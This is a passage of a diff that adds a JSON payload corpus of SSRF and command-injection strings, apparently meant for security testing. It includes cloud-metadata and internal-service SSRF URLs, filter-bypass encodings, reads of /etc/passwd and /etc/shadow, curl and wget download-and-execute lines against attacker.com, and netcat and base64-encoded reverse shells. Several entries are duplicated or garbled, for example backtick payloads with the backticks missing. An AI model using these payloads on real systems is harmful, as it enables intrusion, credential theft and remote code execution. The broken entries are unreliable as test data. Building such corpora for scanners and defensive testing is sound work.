+    "description": "SSRF to Azure instance metadata",
+    "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "context": "Azure VM metadata",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-006",
+    "description": "SSRF to internal Redis service",
+    "payload": "redis://127.0.0.1:6379",
+    "context": "Access internal Redis",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-007",
+    "description": "SSRF to internal Memcached service",
+    "payload": "memcached://127.0.0.1:11211",
+    "context": "Access internal Memcached",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-008",
+    "description": "SSRF to internal FTP server",
+    "payload": "ftp://127.0.0.1/",
+    "context": "Access internal FTP",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-009",
+    "description": "SSRF to internal SMB share",
+    "payload": "smb://192.168.1.100/share",
+    "context": "Access internal SMB share",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-010",
+    "description": "SSRF to internal Docker API",
+    "payload": "http://127.0.0.1:2375/containers/json",
+    "context": "Access Docker API",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-011",
+    "description": "SSRF to internal Kubernetes API",
+    "payload": "https://kubernetes.default.svc/api",
+    "context": "Access Kubernetes API",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-012",
+    "description": "SSRF to internal Jenkins API",
+    "payload": "http://127.0.0.1:8080/api/json",
+    "context": "Access Jenkins API",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-013",
+    "description": "SSRF to internal Elasticsearch cluster",
+    "payload": "http://127.0.0.1:9200/_cat/indices?v",
+    "context": "Access Elasticsearch",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-014",
+    "description": "SSRF to internal RabbitMQ management API",
+    "payload": "http://127.0.0.1:15672/api/overview",
+    "context": "Access RabbitMQ API",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-015",
+    "description": "SSRF to internal MySQL service",
+    "payload": "mysql://127.0.0.1:3306",
+    "context": "Access MySQL service",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-016",
+    "description": "SSRF to internal PostgreSQL service",
+    "payload": "postgresql://127.0.0.1:5432",
+    "context": "Access PostgreSQL service",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-017",
+    "description": "SSRF to internal SMTP server",
+    "payload": "smtp://127.0.0.1:25",
+    "context": "Access SMTP server",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-018",
+    "description": "SSRF to internal SNMP service",
+    "payload": "snmp://127.0.0.1",
+    "context": "Access SNMP service",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-019",
+    "description": "SSRF to internal LDAP service",
+    "payload": "ldap://127.0.0.1:389",
+    "context": "Access LDAP service",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-021",
+    "description": "SSRF with URL encoded internal IP",
+    "payload": "http://%31%39%32.%31%36%38.%31.%31/",
+    "context": "URL encoded internal IP",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-022",
+    "description": "SSRF with octal encoded IP",
+    "payload": "http://0300.0250.0001.0001/",
+    "context": "Octal encoded IP address",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-023",
+    "description": "SSRF with decimal encoded IP",
+    "payload": "http://3232235777/",
+    "context": "Decimal encoded IP address",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-024",
+    "description": "SSRF with IPv6 loopback",
+    "payload": "http://[::1]/",
+    "context": "IPv6 localhost",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-025",
+    "description": "SSRF with file protocol to read local file",
+    "payload": "file:///etc/passwd",
+    "context": "Local file read attempt",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-026",
+    "description": "SSRF with gopher protocol to send raw TCP",
+    "payload": "gopher://127.0.0.1:6379/_SET%20key%201%0D%0A",
+    "context": "Gopher protocol to Redis",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-027",
+    "description": "SSRF with data URI scheme",
+    "payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgnU1NSRiBFeHBlcmltZW50Jyk8L3NjcmlwdD4=",
+    "context": "Data URI with embedded script",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-028",
+    "description": "SSRF with javascript URI scheme",
+    "payload": "javascript:alert('SSRF')",
+    "context": "JavaScript URI scheme",
+    "type": "SSRF",
+    "severity": "low"
+  },
+  {
+    "id": "ssrf-029",
+    "description": "SSRF with file descriptor access",
+    "payload": "file:///proc/self/environ",
+    "context": "Access process environment",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-030",
+    "description": "SSRF with nested URL encoding",
+    "payload": "http://%31%32%37.%30.%30.%31%2F%2E%2E%2F%2E%2E%2Fetc/passwd",
+    "context": "Nested URL encoded path traversal",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-031",
+    "description": "SSRF with FTP protocol and directory traversal",
+    "payload": "ftp://127.0.0.1/../../../../etc/passwd",
+    "context": "FTP directory traversal",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-032",
+    "description": "SSRF with SMB protocol and UNC path",
+    "payload": "smb://127.0.0.1/../../../../Windows/System32/drivers/etc/hosts",
+    "context": "SMB UNC path traversal",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-033",
+    "description": "SSRF with HTTP request smuggling attempt",
+    "payload": "http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a",
+    "context": "HTTP request smuggling",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-034",
+    "description": "SSRF with HTTP header injection",
+    "payload": "http://127.0.0.1:80/\r\nX-Injected-Header: evil",
+    "context": "HTTP header injection",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-035",
+    "description": "SSRF with HTTP basic auth to internal service",
+    "payload": "http://admin:password@127.0.0.1/admin",
+    "context": "Basic auth credentials",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-036",
+    "description": "SSRF with HTTP redirect to internal IP",
+    "payload": "http://external.com/redirect?url=http://127.0.0.1/",
+    "context": "Redirect to internal IP",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-037",
+    "description": "SSRF with DNS rebinding attack",
+    "payload": "http://evil.com/",
+    "context": "DNS rebinding to internal IP",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-038",
+    "description": "SSRF with IPv4 mapped IPv6 address",
+    "payload": "http://[::ffff:127.0.0.1]/",
+    "context": "IPv4 mapped IPv6",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-039",
+    "description": "SSRF with encoded newline characters",
+    "payload": "http://127.0.0.1/%0a%0d",
+    "context": "Encoded newline injection",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-040",
+    "description": "SSRF with HTTP POST method override",
+    "payload": "http://127.0.0.1/?_method=POST",
+    "context": "Method override parameter",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-041",
+    "description": "SSRF with HTTP chunked transfer encoding",
+    "payload": "http://127.0.0.1/chunked",
+    "context": "Chunked transfer encoding test",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-042",
+    "description": "SSRF with HTTP TRACE method",
+    "payload": "http://127.0.0.1/trace",
+    "context": "HTTP TRACE method test",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-043",
+    "description": "SSRF with HTTP OPTIONS method",
+    "payload": "http://127.0.0.1/options",
+    "context": "HTTP OPTIONS method test",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-044",
+    "description": "SSRF with HTTP CONNECT method",
+    "payload": "http://127.0.0.1/connect",
+    "context": "HTTP CONNECT method test",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-045",
+    "description": "SSRF with HTTP PATCH method",
+    "payload": "http://127.0.0.1/patch",
+    "context": "HTTP PATCH method test",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-046",
+    "description": "SSRF with HTTP DELETE method",
+    "payload": "http://127.0.0.1/delete",
+    "context": "HTTP DELETE method test",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-047",
+    "description": "SSRF with HTTP PUT method",
+    "payload": "http://127.0.0.1/put",
+    "context": "HTTP PUT method test",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-048",
+    "description": "HTTP PUT method test",
+    "payload": "http://127.0.0.1/put",
+    "context": "HTTP PUT method test",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-049",
+    "description": "SSRF with HTTP header injection via URL",
+    "payload": "http://127.0.0.1/\r\nX-Forwarded-For: 127.0.0.1",
+    "context": "Inject X-Forwarded-For header",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-051",
+    "description": "SSRF with dict protocol to query dictionary service",
+    "payload": "dict://127.0.0.1/",
+    "context": "Access internal dictionary service",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-052",
+    "description": "SSRF with telnet protocol",
+    "payload": "telnet://127.0.0.1:23",
+    "context": "Access internal telnet service",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-053",
+    "description": "SSRF with ldap protocol to query LDAP server",
+    "payload": "ldap://127.0.0.1:389/ou=users,dc=example,dc=com?uid",
+    "context": "LDAP query",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-054",
+    "description": "SSRF with rdp protocol",
+    "payload": "rdp://127.0.0.1:3389",
+    "context": "Access internal RDP service",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-055",
+    "description": "SSRF with smb protocol to access Windows share",
+    "payload": "smb://127.0.0.1/share",
+    "context": "Access SMB share",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-056",
+    "description": "SSRF with nfs protocol",
+    "payload": "nfs://127.0.0.1/export",
+    "context": "Access NFS export",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-057",
+    "description": "SSRF with imap protocol",
+    "payload": "imap://127.0.0.1:143",
+    "context": "Access IMAP mail server",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-058",
+    "description": "SSRF with pop3 protocol",
+    "payload": "pop3://127.0.0.1:110",
+    "context": "Access POP3 mail server",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-059",
+    "description": "SSRF with mqtt protocol",
+    "payload": "mqtt://127.0.0.1:1883",
+    "context": "Access MQTT broker",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-060",
+    "description": "SSRF with ws protocol (WebSocket)",
+    "payload": "ws://127.0.0.1:8080/",
+    "context": "Access WebSocket service",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-061",
+    "description": "SSRF with wss protocol (Secure WebSocket)",
+    "payload": "wss://127.0.0.1:8443/",
+    "context": "Access secure WebSocket service",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-062",
+    "description": "SSRF with bitcoin protocol",
+    "payload": "bitcoin://127.0.0.1/",
+    "context": "Bitcoin protocol scheme",
+    "type": "SSRF",
+    "severity": "low"
+  },
+  {
+    "id": "ssrf-063",
+    "description": "SSRF with magnet protocol",
+    "payload": "magnet:?xt=urn:btih:abcdef1234567890",
+    "context": "Magnet link protocol",
+    "type": "SSRF",
+    "severity": "low"
+  },
+  {
+    "id": "ssrf-064",
+    "description": "SSRF with ssh protocol",
+    "payload": "ssh://127.0.0.1:22",
+    "context": "Access SSH service",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-065",
+    "description": "SSRF with tel protocol",
+    "payload": "tel:+1234567890",
+    "context": "Telephone protocol",
+    "type": "SSRF",
+    "severity": "low"
+  },
+  {
+    "id": "ssrf-066",
+    "description": "SSRF with sms protocol",
+    "payload": "sms:+1234567890",
+    "context": "SMS protocol",
+    "type": "SSRF",
+    "severity": "low"
+  },
+  {
+    "id": "ssrf-067",
+    "description": "SSRF with geo protocol",
+    "payload": "geo:37.786971,-122.399677",
+    "context": "Geolocation protocol",
+    "type": "SSRF",
+    "severity": "low"
+  },
+  {
+    "id": "ssrf-068",
+    "description": "SSRF with svn protocol",
+    "payload": "svn://127.0.0.1/repo",
+    "context": "Subversion protocol",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-069",
+    "description": "SSRF with git protocol",
+    "payload": "git://127.0.0.1/repo.git",
+    "context": "Git protocol",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-071",
+    "description": "SSRF with double URL encoding",
+    "payload": "http://%2531%25327%2532%253E%253E%253E/",
+    "context": "Double URL encoded IP",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-072",
+    "description": "SSRF with mixed case scheme to bypass filters",
+    "payload": "HtTp://127.0.0.1/",
+    "context": "Mixed case HTTP scheme",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-073",
+    "description": "SSRF with embedded null byte to bypass filters",
+    "payload": "http://127.0.0.1%00.example.com/",
+    "context": "Null byte injection",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-074",
+    "description": "SSRF with CRLF injection in URL",
+    "payload": "http://127.0.0.1/\r\nSet-Cookie:evil=1",
+    "context": "CRLF injection",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-075",
+    "description": "SSRF with protocol chaining using gopher",
+    "payload": "gopher://127.0.0.1:6379/_SET%20key%201%0D%0A",
+    "context": "Gopher protocol to Redis",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-076",
+    "description": "SSRF with IPv6 embedded IPv4 and port",
+    "payload": "http://[::ffff:192.168.1.1]:8080/",
+    "context": "IPv6 embedded IPv4 with port",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-077",
+    "description": "SSRF with DNS rebinding via external domain",
+    "payload": "http://evil.com/",
+    "context": "DNS rebinding attack",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-078",
+    "description": "SSRF with HTTP header injection via URL encoding",
+    "payload": "http://127.0.0.1/%0d%0aX-Injected-Header:evil",
+    "context": "HTTP header injection",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-079",
+    "description": "SSRF with HTTP request smuggling attempt",
+    "payload": "http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a",
+    "context": "Request smuggling",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-080",
+    "description": "SSRF with file protocol and directory traversal",
+    "payload": "file:///etc/passwd%00",
+    "context": "File read with null byte",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-081",
+    "description": "SSRF with HTTP basic auth and URL encoding",
+    "payload": "http://admin%3Apassword@127.0.0.1/",
+    "context": "Basic auth with encoding",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-082",
+    "description": "SSRF with HTTP redirect to internal IP",
+    "payload": "http://external.com/redirect?url=http://127.0.0.1/",
+    "context": "Redirect to internal IP",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-083",
+    "description": "SSRF with HTTP POST method override",
+    "payload": "http://127.0.0.1/?_method=POST",
+    "context": "Method override",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-084",
+    "description": "SSRF with HTTP chunked transfer encoding",
+    "payload": "http://127.0.0.1/chunked",
+    "context": "Chunked transfer encoding",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-085",
+    "description": "SSRF with HTTP TRACE method",
+    "payload": "http://127.0.0.1/trace",
+    "context": "HTTP TRACE method",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-086",
+    "description": "SSRF with HTTP OPTIONS method",
+    "payload": "http://127.0.0.1/options",
+    "context": "HTTP OPTIONS method",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-087",
+    "description": "SSRF with HTTP CONNECT method",
+    "payload": "http://127.0.0.1/connect",
+    "context": "HTTP CONNECT method",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-088",
+    "description": "SSRF with HTTP PATCH method",
+    "payload": "http://127.0.0.1/patch",
+    "context": "HTTP PATCH method",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-089",
+    "description": "SSRF with HTTP DELETE method",
+    "payload": "http://127.0.0.1/delete",
+    "context": "HTTP DELETE method",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-090",
+    "description": "SSRF with HTTP PUT method",
+    "payload": "http://127.0.0.1/put",
+    "context": "HTTP PUT method",
+    "type": "SSRF",
+    "severity": "medium"
+  },
+  {
+    "id": "ssrf-091",
+    "description": "SSRF with IPv4 in hexadecimal",
+    "payload": "http://0x7f.0x0.0x0.0x1/",
+    "context": "Hexadecimal IPv4 address",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-092",
+    "description": "SSRF with IPv4 in mixed notation",
+    "payload": "http://127.1/",
+    "context": "Shortened IPv4 address",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-093",
+    "description": "SSRF with IPv4 in integer format",
+    "payload": "http://2130706433/",
+    "context": "Integer IPv4 address",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-094",
+    "description": "SSRF with HTTP userinfo section to bypass filters",
+    "payload": "http://127.0.0.1@evil.com/",
+    "context": "Userinfo in URL",
+    "type": "SSRF",
+    "severity": "high"
+  },
+  {
+    "id": "ssrf-095",
+    "description": "SSRF with HTTP URL fragment",
+    "payload": "http://127.0.0.1/#fragment",
+    "context": "URL fragment",
+    "type": "SSRF",
+    "severity": "low"
+  },
+  {
+    "id": "ssrf-096",
+    "description": "SSRF with HTTP URL query parameter injection",
+    "payload": "http://127.0.0.1/?param=value",
+    "context": "Query parameter",
+    "type": "SSRF",
+    "severity": "low"
+  },
+  {
+    "id": "ssrf-097",
+    "description": "SSRF with HTTP URL path traversal",
+    "payload": "http://127.0.0.1/../../../../etc/passwd",
+    "context": "Path traversal",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-098",
+    "description": "SSRF with HTTP URL encoded path traversal",
+    "payload": "http://127.0.0.1/%2e%2e/%2e%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "context": "URL encoded path traversal",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "ssrf-099",
+    "description": "SSRF with HTTP URL encoded double slash",
+    "payload": "http://127.0.0.1/%2f%2f/etc/passwd",
+    "context": "Encoded double slash",
+    "type": "SSRF",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-001",
+    "description": "Basic command injection with semicolon",
+    "payload": "; ls -la",
+    "context": "Inject list directory command",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-002",
+    "description": "Command injection with && operator",
+    "payload": "&& cat /etc/passwd",
+    "context": "Inject read passwd file",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-003",
+    "description": "Command injection with pipe operator",
+    "payload": "| whoami",
+    "context": "Inject whoami command",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-004",
+    "description": "Command injection with backticks",
+    "payload": "id",
+    "context": "Inject id command using backticks",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-005",
+    "description": "Command injection with $() syntax",
+    "payload": "$(uname -a)",
+    "context": "Inject uname command",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-006",
+    "description": "Command injection with nested $()",
+    "payload": "$(echo $(whoami))",
+    "context": "Nested command substitution",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-007",
+    "description": "Command injection with ampersand and sleep",
+    "payload": "& sleep 10",
+    "context": "Inject sleep command for timing attack",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-008",
+    "description": "Command injection with newline character",
+    "payload": "&& echo 'injected'\n",
+    "context": "Inject command with newline",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-009",
+    "description": "Command injection with semicolon and curl",
+    "payload": "; curl http://attacker.com",
+    "context": "Exfiltrate data via curl",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-010",
+    "description": "Command injection with semicolon and wget",
+    "payload": "; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh",
+    "context": "Download and execute malware",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-011",
+    "description": "Command injection with pipe and netcat reverse shell",
+    "payload": "| nc attacker.com 4444 -e /bin/sh",
+    "context": "Reverse shell via netcat",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-012",
+    "description": "Command injection with backticks and whoami",
+    "payload": "whoami",
+    "context": "Execute whoami command",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-013",
+    "description": "Command injection with $() and id",
+    "payload": "$(id)",
+    "context": "Execute id command",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-014",
+    "description": "Command injection with semicolon and echo",
+    "payload": "; echo injected",
+    "context": "Simple echo injection",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-015",
+    "description": "Command injection with && and cat /etc/shadow",
+    "payload": "&& cat /etc/shadow",
+    "context": "Read shadow file",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-016",
+    "description": "Command injection with semicolon and id",
+    "payload": "; id",
+    "context": "Execute id command",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-017",
+    "description": "Command injection with pipe and env",
+    "payload": "| env",
+    "context": "Print environment variables",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-018",
+    "description": "Command injection with backticks and ls",
+    "payload": "ls /",
+    "context": "List root directory",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-019",
+    "description": "Command injection with $() and ps",
+    "payload": "$(ps aux)",
+    "context": "List running processes",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-021",
+    "description": "Command injection with URL encoding",
+    "payload": "%3B%20id",
+    "context": "URL encoded semicolon and id command",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-022",
+    "description": "Command injection with nested backticks",
+    "payload": "`echo \\whoami\\`",
+    "context": "Nested backticks execution",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-023",
+    "description": "Command injection with environment variable",
+    "payload": "; echo $USER",
+    "context": "Print current user environment variable",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-025",
+    "description": "Command injection with base64 encoded command",
+    "payload": "; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash",
+    "context": "Base64 encoded reverse shell",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-026",
+    "description": "Command injection with command substitution and sleep",
+    "payload": "$(sleep 10)",
+    "context": "Timing attack with sleep",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-027",
+    "description": "Command injection with semicolon and nested $()",
+    "payload": "; echo $(whoami)",
+    "context": "Nested command substitution",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-028",
+    "description": "Command injection with backslash escaping",
+    "payload": "; echo injected\\; ls",
+    "context": "Escape semicolon",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-029",
+    "description": "Command injection with multiple command separators",
+    "payload": "; ls -la && whoami || echo failed",
+    "context": "Multiple command chaining",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-030",
+    "description": "Command injection with command grouping",
+    "payload": "; (id; uname -a)",
+    "context": "Grouped commands",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-031",
+    "description": "Command injection with subshell",
+    "payload": "; (sleep 5)",
+    "context": "Subshell with sleep",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-032",
+    "description": "Command injection with command chaining and comments",
+    "payload": "; ls -la #",
+    "context": "Command injection with comment",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-033",
+    "description": "Command injection with backticks and nested $()",
+    "payload": "echo $(whoami)",
+    "context": "Nested command execution",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-034",
+    "description": "Command injection with semicolon and environment variable expansion",
+    "payload": "; echo $PATH",
+    "context": "Print PATH environment variable",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-035",
+    "description": "Command injection with command substitution and echo",
+    "payload": "$(echo injected)",
+    "context": "Echo injected string",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-036",
+    "description": "Command injection with semicolon and nested subshell",
+    "payload": "; (echo injected; whoami)",
+    "context": "Multiple commands in subshell",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-037",
+    "description": "Command injection with semicolon and sleep for timing",
+    "payload": "; sleep 15",
+    "context": "Timing attack",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-038",
+    "description": "Command injection with pipe and reverse shell",
+    "payload": "| nc attacker.com 4444 -e /bin/sh",
+    "context": "Reverse shell via netcat",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-039",
+    "description": "Command injection with semicolon and wget download",
+    "payload": "; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh",
+    "context": "Download and execute script",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-040",
+    "description": "Command injection with semicolon and curl download",
+    "payload": "; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh",
+    "context": "Download and execute script",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-041",
+    "description": "Command injection with semicolon and base64 decode",
+    "payload": "; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash",
+    "context": "Base64 encoded reverse shell",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-042",
+    "description": "Command injection with semicolon and environment variable manipulation",
+    "payload": "; export MALICIOUS=1",
+    "context": "Set environment variable",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-043",
+    "description": "Command injection with semicolon and echo to file",
+    "payload": "; echo 'malicious' > /tmp/malicious.txt",
+    "context": "Write to file",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-044",
+    "description": "Command injection with semicolon and chmod",
+    "payload": "; chmod +x /tmp/m.sh",
+    "context": "Change file permissions",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-045",
+    "description": "Command injection with semicolon and cat /etc/shadow",
+    "payload": "; cat /etc/shadow",
+    "context": "Read shadow file",
+    "type": "Command Injection",
+    "severity": "critical"
+  },
+  {
+    "id": "cmdinj-046",
+    "description": "Command injection with semicolon and echo with special characters",
+    "payload": "; echo 'injected; ls -la'",
+    "context": "Echo with special characters",
+    "type": "Command Injection",
+    "severity": "medium"
+  },
+  {
+    "id": "cmdinj-047",
+    "description": "Command injection with semicolon and nested command with quotes",
+    "payload": "; echo \"$(whoami)\"",
+    "context": "Nested command with quotes",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-049",
+    "description": "Command injection with semicolon and perl command",
+    "payload": "; perl -e 'print id'",
+    "context": "Execute command via perl",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
+    "id": "cmdinj-051",
+    "description": "Windows cmd injection with & separator",
+    "payload": "& whoami",
+    "context": "Execute whoami command",
+    "type": "Command Injection",
+    "severity": "high"
+  },
+  {
